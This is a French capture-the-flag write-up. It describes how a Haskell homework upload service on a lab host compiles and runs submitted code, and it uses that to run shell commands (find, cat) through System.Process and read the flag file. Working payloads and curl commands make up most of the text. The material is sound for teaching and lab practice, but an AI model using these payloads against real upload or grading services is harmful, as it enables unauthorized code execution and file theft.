# Fun With Functional

## 1. Informations générales

**Challenge :** Fun With Functional
**Difficulté :** Easy
**Valeur :** 500 points
**Cible :** `10.10.0.26`
**Objectif :** retrouver le fichier `user.txt`

---

## 2. Reconnaissance

Un scan complet des ports est effectué avec Nmap :

```bash
nmap -sC -sV -p- 10.10.0.26
```

Résultat intéressant :

```text
22/tcp   open  ssh
5001/tcp open  commplex-link?
```

Le port `5001` présente une application web utilisant :

```text
Werkzeug/3.1.8 Python/3.13.5
```

L'accès à la page d'accueil révèle une application intitulée :

```text
FUN with functionnal !
```

La page indique également :

> Welcome to Functional Programming!

et propose un lien vers `/homework`.

---

## 3. Analyse de `/homework`

L'accès à :

```text
http://10.10.0.26:5001/homework
```

affiche une page demandant d'envoyer un programme Haskell :

```text
Send me a haskell program that send "I love Haskell",
don't forget to add .hs to your file

It will then be send to an autocorrect tool that will
correct it for me. It's secure because it's in Haskell!
```

Un formulaire permet d'envoyer un fichier `.hs`.

Cette fonctionnalité est particulièrement intéressante puisqu'un fichier de code est envoyé à un serveur.

---

## 4. Vérification du fonctionnement de l'upload

Un premier programme Haskell simple est créé :

```bash
cat > test.hs <<'EOF'
main = putStrLn "I love Haskell"
EOF
```

Il est envoyé au serveur :

```bash
curl -i -X POST \
  -F 'file=@test.hs' \
  http://10.10.0.26:5001/homework
```

Le serveur redirige vers :

```text
/uploads/test.hs
```

En suivant la redirection :

```bash
curl -i -L \
  -F 'file=@test.hs' \
  http://10.10.0.26:5001/homework
```

Le résultat contient :

```text
I love Haskell
```

Le programme Haskell a donc bien été traité par le serveur.

---

## 5. Vérification de la compilation

Pour déterminer ce que fait réellement le serveur, un programme Haskell invalide est envoyé.

```bash
cat > bad.hs <<'EOF'
this is not valid haskell
EOF
```

Puis :

```bash
curl -i -L \
  -F 'file=@bad.hs' \
  http://10.10.0.26:5001/homework
```

Le serveur retourne :

```text
Couldn't compile your haskell program.
```

Cela confirme que le fichier `.hs` est **compilé côté serveur**.

Le serveur ne se contente donc pas de lire le contenu du fichier : il le transmet réellement au compilateur Haskell.

---

## 6. Exécution de code Haskell côté serveur

On peut tester les capacités du programme en utilisant le module `System.Directory`.

Le programme suivant liste le contenu du répertoire courant :

```haskell
import System.Directory

main = do
    files <- listDirectory "."
    print files
```

Il est enregistré dans :

```bash
cat > ls.hs <<'EOF'
import System.Directory

main = do
    files <- listDirectory "."
    print files
EOF
```

Puis envoyé :

```bash
curl -s -L \
  -F 'file=@ls.hs' \
  http://10.10.0.26:5001/homework
```

Le serveur retourne notamment :

```text
[1 of 2] Compiling Main (...)
[2 of 2] Linking /var/www/html/uploads/ls
["run","proc","home","boot","bin","lib","mnt","sys","var","srv","dev","sbin","root","tmp","etc","lib64","opt","media","usr",".dockerenv"]
```

Cette réponse est particulièrement importante.

On observe :

```text
[2 of 2] Linking /var/www/html/uploads/ls
```

Le serveur compile donc notre programme et crée un exécutable.

Surtout, le résultat de `listDirectory` est celui du système de fichiers **du serveur distant**, ce qui démontre que notre code Haskell est exécuté côté serveur.

---

## 7. Exécution de commandes système

Le module `System.Process` permet d'exécuter des programmes externes.

Un premier test consiste à rechercher `user.txt` :

```haskell
import System.Process

main = do
    result <- readProcess "find" ["/", "-name", "user.txt"] ""
    putStrLn result
```

Cependant, cette tentative produit des erreurs `Permission denied`.

De plus, `readProcess` considère comme une erreur le fait que la commande termine avec un code de retour différent de zéro.

On adapte donc la commande :

```haskell
import System.Process

main = do
    result <- readProcess "sh" ["-c", "find / -name user.txt 2>/dev/null || true"] ""
    putStrLn result
```

Le `2>/dev/null` masque les erreurs de permission et :

```bash
|| true
```

force la commande à retourner un code `0`, même si `find` rencontre des fichiers auxquels l'utilisateur n'a pas accès.

Le fichier est finalement trouvé :

```text
/home/prof/user.txt
```

---

## 8. Identification du répertoire utilisateur

Une vérification supplémentaire est effectuée sur `/home` :

```haskell
import System.Directory

main = do
    files <- listDirectory "/home"
    print files
```

Résultat :

```text
["prof"]
```

Le fichier recherché se trouve donc dans :

```text
/home/prof/user.txt
```

---

## 9. Lecture du flag

Il suffit maintenant d'utiliser `System.Process` pour exécuter `cat` sur le fichier.

Programme final :

```haskell
import System.Process

main = do
    result <- readProcess "cat" ["/home/prof/user.txt"] ""
    putStrLn result
```

Le fichier est créé :

```bash
cat > read.hs <<'EOF'
import System.Process

main = do
    result <- readProcess "cat" ["/home/prof/user.txt"] ""
    putStrLn result
EOF
```

Puis envoyé au serveur :

```bash
curl -s -L \
  -F 'file=@read.hs' \
  http://10.10.0.26:5001/homework
```

Le serveur compile et exécute le programme :

```text
[1 of 2] Compiling Main
[2 of 2] Linking /var/www/html/uploads/read
```

Puis affiche le contenu de `user.txt` :

```text
EPI{********}
```

---

# 10. Flag

```text
EPI{********}
```

---

# 11. Analyse de la vulnérabilité

La vulnérabilité repose sur le fait que l'application accepte du **code source Haskell contrôlé par l'utilisateur**, puis le compile et l'exécute directement sur le serveur.

Le processus est essentiellement :

```text
Utilisateur
    │
    │ fichier .hs
    ▼
Application web
    │
    │ GHC
    ▼
Compilation
    │
    ▼
Exécutable
    │
    ▼
Exécution sur le serveur
```

L'absence de sandbox efficace permet au programme Haskell d'accéder aux ressources du système et d'exécuter des commandes externes.

Le module :

```haskell
System.Process
```

permet notamment d'appeler des programmes comme :

```text
sh
find
cat
```

L'attaquant obtient ainsi une capacité d'exécution de commandes sur la machine distante.

---

# 12. Méthodologie générale retenue

La chaîne d'exploitation peut être résumée ainsi :

```text
Nmap
  ↓
Port 5001
  ↓
/homework
  ↓
Upload d'un fichier .hs
  ↓
Vérification avec un programme Haskell valide
  ↓
Test avec un programme invalide
  ↓
Confirmation de la compilation côté serveur
  ↓
System.Directory
  ↓
Énumération du système de fichiers
  ↓
System.Process
  ↓
Exécution de commandes système
  ↓
find / -name user.txt
  ↓
/home/prof/user.txt
  ↓
cat /home/prof/user.txt
  ↓
FLAG
```

# 13. Conclusion

Le challenge repose sur une fausse séparation entre « envoyer un programme pour correction » et « exécuter du code ».

Le fait que le serveur compile et exécute directement un programme Haskell fourni par l'utilisateur transforme la fonctionnalité d'upload en **primitive d'exécution de code arbitraire**.

L'utilisation successive de `System.Directory` puis `System.Process` permet d'énumérer le système, d'identifier l'emplacement de `user.txt` et finalement d'en lire le contenu.

**Flag final :**

```text
EPI{********}
```
